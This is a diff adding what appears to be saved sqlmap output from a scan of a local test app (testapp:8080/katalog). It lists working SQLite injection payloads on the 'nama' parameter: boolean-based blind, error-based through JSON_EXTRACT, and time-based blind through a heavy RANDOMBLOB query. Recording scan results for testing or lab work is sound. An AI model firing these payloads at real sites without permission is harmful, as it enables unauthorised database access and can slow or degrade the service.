@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 34 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: http://testapp:8080/katalog?nama=rajdoll' AND CASE WHEN 3571=3571 THEN 3571 ELSE JSON(CHAR(101,70,113,118)) END-- wsBv
+
+    Type: error-based
+    Title: SQLite >= 3.9 OR error-based - WHERE or HAVING clause (JSON path)
+    Payload: http://testapp:8080/katalog?nama=rajdoll' OR 7097=JSON_EXTRACT(CHAR(123,125),CHAR(113,98,122,120,113)||(SELECT (CASE WHEN (7097=7097) THEN 1 ELSE 0 END))||CHAR(113,112,118,112,113))-- RJbf
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: http://testapp:8080/katalog?nama=rajdoll' OR 4532=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- hLRA
+---
+back-end DBMS: SQLite
